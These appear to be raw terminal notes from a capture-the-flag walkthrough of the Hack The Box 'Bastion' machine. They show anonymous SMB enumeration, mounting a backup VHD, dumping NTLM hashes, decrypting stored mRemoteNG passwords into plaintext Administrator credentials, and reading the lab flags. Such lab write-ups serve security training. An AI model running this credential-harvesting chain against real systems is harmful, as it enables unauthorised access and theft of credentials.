@@ -1,0 +1,432 @@
+root@kali:~/HTB/Arkham# rpcclient -U "" bastion.htb
+Enter WORKGROUP\'s password: anonymous
+rpcclient $> srvinfo
+	BASTION.HTB    Wk Sv NT SNT         
+	platform_id     :	500
+	os version      :	10.0
+	server type     :	0x9003
+rpcclient $> getusername
+Account Name: Guest, Authority Name: BASTION
+rpcclient $> lsaenumsid
+found 11 SIDs
+
+S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
+S-1-5-80-0
+S-1-5-6
+S-1-5-32-559
+S-1-5-32-555
+S-1-5-32-551
+S-1-5-32-545
+S-1-5-32-544
+S-1-5-20
+S-1-5-19
+S-1-1-0
+rpcclient $> 
+rpcclient $> lookupsid S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
+command not found: lookupsid
+rpcclient $> lookupsids S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
+S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420 NT SERVICE\WdiServiceHost (5)
+rpcclient $> lookupsids S-1-5-80-0
+S-1-5-80-0 NT SERVICE\ALL SERVICES (5)
+rpcclient $> lookupsids S-1-5-6
+S-1-5-6 NT AUTHORITY\SERVICE (5)
+rpcclient $> lookupsids S-1-5-32-559
+S-1-5-32-559 BUILTIN\Performance Log Users (4)
+rpcclient $> lookupsids S-1-5-32-555
+S-1-5-32-555 BUILTIN\Remote Desktop Users (4)
+rpcclient $> lookupsids S-1-5-32-551
+S-1-5-32-551 BUILTIN\Backup Operators (4)
+rpcclient $> lookupsids S-1-5-32-545
+S-1-5-32-545 BUILTIN\Users (4)
+rpcclient $> lookupsids S-1-5-32-544
+S-1-5-32-544 BUILTIN\Administrators (4)
+rpcclient $> lookupsids S-1-5-20
+S-1-5-20 NT AUTHORITY\NETWORK SERVICE (5)
+rpcclient $> lookupsids S-1-5-19
+S-1-5-19 NT AUTHORITY\LOCAL SERVICE (5)
+rpcclient $> lookupsids S-1-1-0
+S-1-1-0 \Everyone (5)
+rpcclient $> 
+
+
+oot@kali:~/HTB/Bastion# smbclient -L //bastion.htb
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	Backups         Disk      
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+Reconnecting with SMB1 for workgroup listing.
+Connection to bastion.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Failed to connect with SMB1 -- no workgroup available
+
+
+root@kali:~/HTB/Bastion# smbmap -p anonymous -H bastion.htb
+[+] Finding open SMB ports....
+[+] Guest SMB session established on bastion.htb...
+[+] IP: bastion.htb:445	Name: bastion.htb                                       
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	ADMIN$                                            	NO ACCESS
+	Backups                                           	READ, WRITE
+	[!] Unable to remove test directory at \\bastion.htb\Backups\jdfCbTgSzU, plreae remove manually
+	C$                                                	NO ACCESS
+	IPC$                                              	READ ONLY
+root@kali:~/HTB/Bastion# 
+
+root@kali:~/HTB/Bastion# smbmap -p anonymous -R Backups -H bastion.htb
+[+] Finding open SMB ports....
+[+] Guest SMB session established on bastion.htb...
+[+] IP: bastion.htb:445	Name: bastion.htb                                       
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	Backups                                           	READ, WRITE
+	[!] Unable to remove test directory at \\bastion.htb\Backups\HxtPcNJaYT, plreae remove manually
+	.\
+	dr--r--r--                0 Thu May  9 16:31:16 2019	.
+	dr--r--r--                0 Thu May  9 16:31:16 2019	..
+	dr--r--r--                0 Thu May  9 16:18:34 2019	GZQnYNslTa
+	dr--r--r--                0 Thu May  9 16:31:16 2019	HxtPcNJaYT
+	dr--r--r--                0 Thu May  9 16:30:02 2019	jdfCbTgSzU
+	dr--r--r--                0 Thu May  9 16:26:48 2019	JEPkgTnWRA
+	-w--w--w--              116 Tue Apr 16 12:43:19 2019	note.txt
+	-r--r--r--                0 Fri Feb 22 13:43:28 2019	SDT65CB.tmp
+	dr--r--r--                0 Thu May  9 16:27:54 2019	TuxzfPmpca
+	dr--r--r--                0 Fri Feb 22 13:44:02 2019	WindowsImageBackup
+	.\\WindowsImageBackup\
+	dr--r--r--                0 Fri Feb 22 13:44:02 2019	.
+	dr--r--r--                0 Fri Feb 22 13:44:02 2019	..
+	dr--r--r--                0 Fri Feb 22 13:45:32 2019	L4mpje-PC
+	.\\WindowsImageBackup\L4mpje-PC\
+	dr--r--r--                0 Fri Feb 22 13:45:32 2019	.
+	dr--r--r--                0 Fri Feb 22 13:45:32 2019	..
+	dr--r--r--                0 Thu May  9 16:28:26 2019	Backup 2019-02-22 124351
+	dr--r--r--                0 Fri Feb 22 13:45:32 2019	Catalog
+	-r--r--r--               16 Fri Feb 22 13:44:02 2019	MediaId
+	dr--r--r--                0 Fri Feb 22 13:45:32 2019	SPPMetadataCache
+	.\\WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\
+	dr--r--r--                0 Thu May  9 16:28:26 2019	.
+	dr--r--r--                0 Thu May  9 16:28:26 2019	..
+	-r--r--r--                0 Thu May  9 16:28:24 2019	.9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd.swp
+	-r--r--r--                0 Thu May  9 16:28:22 2019	.9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd.swx
+	-r--r--r--         37761024 Fri Feb 22 13:44:03 2019	9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
+	-r--r--r--             4096 Thu May  9 16:29:32 2019	9b9cfbc3.swp
+	-r--r--r--       5451853824 Thu May  9 16:31:33 2019	9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
+	-r--r--r--             1186 Fri Feb 22 13:45:32 2019	BackupSpecs.xml
+	-r--r--r--             1078 Fri Feb 22 13:45:32 2019	cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
+	-r--r--r--             8930 Fri Feb 22 13:45:32 2019	cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
+	-r--r--r--             6542 Fri Feb 22 13:45:32 2019	cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
+	-r--r--r--             2894 Fri Feb 22 13:45:32 2019	cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
+	-r--r--r--             1488 Fri Feb 22 13:45:32 2019	cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
+	-r--r--r--             1484 Fri Feb 22 13:45:32 2019	cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
+	-r--r--r--             3844 Fri Feb 22 13:45:32 2019	cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
+	-r--r--r--             3988 Fri Feb 22 13:45:32 2019	cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
+	-r--r--r--             7110 Fri Feb 22 13:45:32 2019	cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
+	-r--r--r--          2374620 Fri Feb 22 13:45:32 2019	cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
+	.\\WindowsImageBackup\L4mpje-PC\Catalog\
+	dr--r--r--                0 Fri Feb 22 13:45:32 2019	.
+	dr--r--r--                0 Fri Feb 22 13:45:32 2019	..
+	-r--r--r--             5698 Fri Feb 22 13:45:32 2019	BackupGlobalCatalog
+	-r--r--r--             7440 Fri Feb 22 13:45:32 2019	GlobalCatalog
+	.\\WindowsImageBackup\L4mpje-PC\SPPMetadataCache\
+	dr--r--r--                0 Fri Feb 22 13:45:32 2019	.
+	dr--r--r--                0 Fri Feb 22 13:45:32 2019	..
+	-r--r--r--            57848 Fri Feb 22 13:45:32 2019	{cd113385-65ff-4ea2-8ced-5630f6feca8f}
+
+root@kali:~/HTB/Bastion# smbmap -p anonymous -R Backups -H bastion.htb -A note.txt -q
+[+] Finding open SMB ports....
+[+] Guest SMB session established on bastion.htb...
+[+] IP: bastion.htb:445	Name: bastion.htb                                       
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	Backups                                           	READ, WRITE
+	[!] Unable to remove test directory at \\bastion.htb\Backups\plqLsEYMUB, plreae remove manually
+	[+] Starting search for files matching 'note.txt' on share Backups.
+	[+] Match found! Downloading: Backups\note.txt
+
+
+
+root@kali:~/HTB/Bastion# smbclient //bastion.htb/Backups
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> help
+?              allinfo        altname        archive        backup         
+blocksize      cancel         case_sensitive cd             chmod          
+chown          close          del            deltree        dir            
+du             echo           exit           get            getfacl        
+geteas         hardlink       help           history        iosize         
+lcd            link           lock           lowercase      ls             
+l              mask           md             mget           mkdir          
+more           mput           newer          notify         open           
+posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
+posix_unlink   posix_whoami   print          prompt         put            
+pwd            q              queue          quit           readlink       
+rd             recurse        reget          rename         reput          
+rm             rmdir          showacls       setea          setmode        
+scopy          stat           symlink        tar            tarmode        
+timeout        translate      unlock         volume         vuid           
+wdel           logon          listconnect    showconnect    tcon           
+tdis           tid            utimes         logoff         ..             
+!              
+smb: \> pwd
+Current directory is \\bastion.htb\Backups\
+smb: \> ls
+  .                                   D        0  Thu May  9 16:40:38 2019
+  ..                                  D        0  Thu May  9 16:40:38 2019
+  ealkVwNjrL                          D        0  Thu May  9 16:39:52 2019
+  GZQnYNslTa                          D        0  Thu May  9 16:18:34 2019
+  HntDcCFQGX                          D        0  Thu May  9 16:40:38 2019
+  HxtPcNJaYT                          D        0  Thu May  9 16:31:16 2019
+  jdfCbTgSzU                          D        0  Thu May  9 16:30:02 2019
+  JEPkgTnWRA                          D        0  Thu May  9 16:26:48 2019
+  note.txt                           AR      116  Tue Apr 16 11:10:09 2019
+  pgMoZlCWdj                          D        0  Thu May  9 16:35:05 2019
+  plqLsEYMUB                          D        0  Thu May  9 16:36:50 2019
+  RhGZdUHeBc                          D        0  Thu May  9 16:33:51 2019
+  SDT65CB.tmp                         A        0  Fri Feb 22 13:43:08 2019
+  sEkajClrNq                          D        0  Thu May  9 16:34:31 2019
+  TuxzfPmpca                          D        0  Thu May  9 16:27:54 2019
+  WindowsImageBackup                  D        0  Fri Feb 22 13:44:02 2019
+
+		7735807 blocks of size 4096. 2765216 blocks available
+smb: \> cd WindowsImageBackup
+smb: \WindowsImageBackup\> ls
+  .                                   D        0  Fri Feb 22 13:44:02 2019
+  ..                                  D        0  Fri Feb 22 13:44:02 2019
+  L4mpje-PC                           D        0  Fri Feb 22 13:45:32 2019
+
+		7735807 blocks of size 4096. 2765216 blocks available
+smb: \WindowsImageBackup\> 
+
+
+Mount VHD
+
+mount //10.10.10.134/Backups <smb_mountpoint>
+modprobe nbd max_part=16
+qemu-nbd --read-only --format=vpc -c /dev/nbd0 /mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
+partprobe /dev/nbd0
+mount -o allow_other /dev/nbd0p1 <vhd_mountpoint>
+
+
+Dump NTLM hashes
+
+samdump2 SYSTEM bootkey
+
+
+
+
+bureaulampje
+
+
+
+
+root@kali:~/HTB/Bastion# ssh L4mpje@bastion.htb
+L4mpje@bastion.htb's password: 
+
+Microsoft Windows [Version 10.0.14393]                                                                                          
+(c) 2016 Microsoft Corporation. All rights reserved.                                                                            
+
+l4mpje@BASTION C:\Users\L4mpje>dir                                                                                              
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is 0CB3-C487                                                                                              
+
+ Directory of C:\Users\L4mpje                                                                                                   
+
+22-02-2019  14:50    <DIR>          .                                                                                           
+22-02-2019  14:50    <DIR>          ..                                                                                          
+22-02-2019  16:26    <DIR>          Contacts                                                                                    
+22-02-2019  16:27    <DIR>          Desktop                                                                                     
+22-02-2019  16:26    <DIR>          Documents                                                                                   
+22-02-2019  16:26    <DIR>          Downloads                                                                                   
+22-02-2019  16:26    <DIR>          Favorites                                                                                   
+22-02-2019  16:26    <DIR>          Links                                                                                       
+22-02-2019  16:26    <DIR>          Music                                                                                       
+22-02-2019  16:26    <DIR>          Pictures                                                                                    
+22-02-2019  16:26    <DIR>          Saved Games                                                                                 
+22-02-2019  16:26    <DIR>          Searches                                                                                    
+22-02-2019  16:26    <DIR>          Videos                                                                                      
+               0 File(s)              0 bytes                                                                                   
+              13 Dir(s)   5.992.845.312 bytes free                                                                              
+
+l4mpje@BASTION C:\Users\L4mpje>cd Desktop                                                                                       
+
+l4mpje@BASTION C:\Users\L4mpje\Desktop>dir                                                                                      
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is 0CB3-C487                                                                                              
+
+ Directory of C:\Users\L4mpje\Desktop                                                                                           
+
+22-02-2019  16:27    <DIR>          .                                                                                           
+22-02-2019  16:27    <DIR>          ..                                                                                          
+23-02-2019  10:07                32 user.txt                                                                                    
+               1 File(s)             32 bytes                                                                                   
+               2 Dir(s)   5.992.845.312 bytes free                                                                              
+
+l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt                                                                            
+9bfe57d5c3309db3a151772f9d86c6cd                                                                                                
+l4mpje@BASTION C:\Users\L4mpje\Desktop>                                                                                         
+
+l4mpje@BASTION C:\Users\L4mpje>dir /adh                                                                                         
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is 0CB3-C487                                                                                              
+
+ Directory of C:\Users\L4mpje                                                                                                   
+
+22-02-2019  14:50    <DIR>          AppData                                                                                     
+22-02-2019  14:50    <JUNCTION>     Application Data [C:\Users\L4mpje\AppData\Roaming]                                          
+22-02-2019  14:50    <JUNCTION>     Cookies [C:\Users\L4mpje\AppData\Local\Microsoft\Windows\INetCookies]                       
+22-02-2019  14:50    <JUNCTION>     Local Settings [C:\Users\L4mpje\AppData\Local]                                              
+22-02-2019  14:50    <JUNCTION>     My Documents [C:\Users\L4mpje\Documents]                                                    
+22-02-2019  14:50    <JUNCTION>     NetHood [C:\Users\L4mpje\AppData\Roaming\Microsoft\Windows\Network Shortcuts]               
+22-02-2019  14:50    <JUNCTION>     PrintHood [C:\Users\L4mpje\AppData\Roaming\Microsoft\Windows\Printer Shortcuts]             
+22-02-2019  14:50    <JUNCTION>     Recent [C:\Users\L4mpje\AppData\Roaming\Microsoft\Windows\Recent]                           
+22-02-2019  14:50    <JUNCTION>     SendTo [C:\Users\L4mpje\AppData\Roaming\Microsoft\Windows\SendTo]                           
+22-02-2019  14:50    <JUNCTION>     Start Menu [C:\Users\L4mpje\AppData\Roaming\Microsoft\Windows\Start Menu]                   
+22-02-2019  14:50    <JUNCTION>     Templates [C:\Users\L4mpje\AppData\Roaming\Microsoft\Windows\Templates]                     
+               0 File(s)              0 bytes                                                                                   
+              11 Dir(s)   5.992.845.312 bytes free                                                                              
+
+l4mpje@BASTION C:\Users\L4mpje>cd AppData/Roaming                                                                               
+
+l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming>dir /adh                                                                         
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is 0CB3-C487                                                                                              
+
+ Directory of C:\Users\L4mpje\AppData\Roaming                                                                                   
+
+File Not Found                                                                                                                  
+
+l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming>dir                                                                              
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is 0CB3-C487                                                                                              
+
+ Directory of C:\Users\L4mpje\AppData\Roaming                                                                                   
+
+22-02-2019  15:01    <DIR>          .                                                                                           
+22-02-2019  15:01    <DIR>          ..                                                                                          
+22-02-2019  14:50    <DIR>          Adobe                                                                                       
+22-02-2019  15:03    <DIR>          mRemoteNG                                                                                   
+               0 File(s)              0 bytes                                                                                   
+               4 Dir(s)   5.992.845.312 bytes free                                                                              
+
+l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming>cd mRemoteNG                                                                     
+
+l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>dir                                                                    
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is 0CB3-C487                                                                                              
+
+ Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG                                                                         
+
+22-02-2019  15:03    <DIR>          .                                                                                           
+22-02-2019  15:03    <DIR>          ..                                                                                          
+22-02-2019  15:03             6.316 confCons.xml                                                                                
+22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup                                                     
+22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup                                                     
+22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup                                                     
+22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup                                                     
+22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup                                                     
+22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup                                                     
+22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup                                                     
+22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup                                                     
+22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup                                                     
+22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup                                                     
+22-02-2019  15:03                51 extApps.xml                                                                                 
+22-02-2019  15:03             5.217 mRemoteNG.log                                                                               
+22-02-2019  15:03             2.245 pnlLayout.xml                                                                               
+22-02-2019  15:01    <DIR>          Themes                                                                                      
+              14 File(s)         76.577 bytes                                                                                   
+               3 Dir(s)   5.992.845.312 bytes free                                                                              
+
+l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>type confCons.xml                                                      
+<?xml version="1.0" encoding="utf-8"?>                                                                                          
+<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GC
+M" KdfIterations="1000" FullFileEncryption="false" Protected="ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0
+oop8R8ddXKAx4KK7sAk6AA" ConfVersion="2.6">                                                                                      
+    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Userna
+me="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
+ Hostname="127.0.0.1" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" Rend
+eringEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeo
+ut="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" Disp
+layThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" R
+edirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" Redire
+ctKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEn
+coding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPa
+ssword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostna
+me="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="
+false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnab
+leFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" I
+nheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false"
+ InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" Inhe
+ritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleS
+ession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="fa
+lse" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoad
+BalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" Inheri
+tExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" 
+InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNC
+Colors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHo
+stname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false
+" InheritRDGatewayDomain="false" />                                                                                             
+    <Node Name="L4mpje-PC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="8d3579b2-e68e-48c1-8f0f-9ee1347c9128"
+ Username="L4mpje" Domain="" Password="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB" Hostnam
+e="192.168.1.75" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" Rendering
+Engine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="f
+alse" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayTh
+emes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" Redire
+ctPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKey
+s="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncodin
+g="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPasswor
+d="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname=""
+ RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false
+" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFon
+tSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" Inheri
+tPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" Inhe
+ritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRe
+directSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSessio
+n="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" 
+InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalan
+ceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtA
+pp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" Inher
+itVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColor
+s="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostnam
+e="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" Inh
+eritRDGatewayDomain="false" />                                                                                                  
+</mrng:Connections>                                                                                                             
+l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>                                                                       
+
+root@kali:~/toolbox# java -jar decipher_mremoteng.jar aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
+User Input: aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
+Use default password for cracking...
+Decrypted Output: thXLHM96BeKL0ER2
+
+root@kali:~/toolbox# java -jar decipher_mremoteng.jar yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB
+User Input: yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB
+Use default password for cracking...
+Decrypted Output: bureaulampje
+
+root@kali:~/HTB/Bastion# ssh administrator@bastion.htb
+administrator@bastion.htb's password: 
+
+Microsoft Windows [Version 10.0.14393]                                                                                          
+(c) 2016 Microsoft Corporation. All rights reserved.                                                                            
+
+administrator@BASTION C:\Users\Administrator>cd Desktop                                                                         
+
+administrator@BASTION C:\Users\Administrator\Desktop>dir                                                                        
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is 0CB3-C487                                                                                              
+
+ Directory of C:\Users\Administrator\Desktop                                                                                    
+
+26-05-2019  20:13    <DIR>          .                                                                                           
+26-05-2019  20:13    <DIR>          ..                                                                                          
+26-05-2019  20:21                 0 OlaBiniIsAPoliticalPrisoner                                                                 
+23-02-2019  10:07                32 root.txt                                                                                    
+               2 File(s)             32 bytes                                                                                   
+               2 Dir(s)  11.425.935.360 bytes free                                                                              
+
+administrator@BASTION C:\Users\Administrator\Desktop>type root.txt                                                              
+958850b91811676ed6620a9c430e65c8                                                                                                
+administrator@BASTION C:\Users\Administrator\Desktop>                                                                           
+
